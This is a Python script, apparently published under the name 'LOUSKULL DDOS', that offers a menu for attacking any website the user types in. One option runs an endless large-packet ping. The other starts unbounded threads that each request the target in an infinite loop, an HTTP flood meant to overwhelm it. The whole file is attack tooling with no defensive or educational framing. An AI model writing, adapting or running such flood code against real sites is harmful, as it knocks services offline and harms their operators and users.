import os
import time
while True:
  os.system("cls")
  os.system("title LOUSKULL DDOS")
  os.system("color 5")
  print(
  """
     _ _   _       _                     _ __            _____ _       _ _ 
 ___|_| |_| |_ _ _| |_   ___ ___ _____  / |  |   ___ _ _|   __| |_ _ _| | |
| . | |  _|   | | | . |_|  _| . |     |/ /|  |__| . | | |__   | '_| | | | |
|_  |_|_| |_|_|___|___|_|___|___|_|_|_|_/ |_____|___|___|_____|_,_|___|_|_|
|___|                                                                      

 GITHUB - github.com/LouSkull    
 DEVELOPER - @statusvisualeffect
  """
  )

  print(
  """
1. Easy ddos 
2. Hard ddos
3. Install modules
4. Exit
  """
  )
  method = input('Choose method ---->    ')

  if method == '1':
    ddos1 = input('Enter target website ---->    ')
    os.system(f"ping {ddos1} -t -l 1000")
    input("Press enter to continue...")

  elif method == '2':
    import requests
    import threading
    ddos2 = input('Enter target website ---->    ')

    def dos():
      try:
          os.system("cls||clear")
          while True:
              print(f"DDOS {ddos2}")
              requests.get(ddos2)
      except requests.exceptions.MissingSchema:
          print("I think you forgot https://")
          input("Press enter to continue...")
          time.sleep(2)
          exit()
          
    while True:
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
      threading.Thread(target=dos).start()
          
  elif method == '3':
    os.system("pip install requests")
    os.system("pip install threading")
    os.system("color 5")
    input("Press enter to continue...")
    
  elif method == '4':
    exit()
    
  else:
    print("HUH?")
    input("Press enter to continue...")
